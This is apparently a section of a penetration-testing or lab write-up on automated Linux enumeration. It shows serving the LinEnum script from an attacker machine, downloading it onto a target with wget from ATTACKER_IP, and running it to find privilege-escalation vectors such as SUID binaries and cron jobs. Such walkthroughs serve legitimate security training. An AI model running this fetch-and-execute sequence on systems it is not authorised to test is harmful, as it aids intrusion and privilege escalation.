# Automated Enumeration

To perform deeper enumeration an automated script was used.

Tool used:
LinEnum

Steps:

1. Host the script on the attacker machine

python3 -m http.server 8000

2. Download the script on the target system

wget ATTACKER_IP:8000/LinEnum.sh

3. Give execution permissions

chmod +x LinEnum.sh

4. Run the script

./LinEnum.sh

LinEnum scans the system and highlights potential privilege escalation vectors such as:

- writable files
- cron jobs
- SUID binaries
- misconfigured permissions
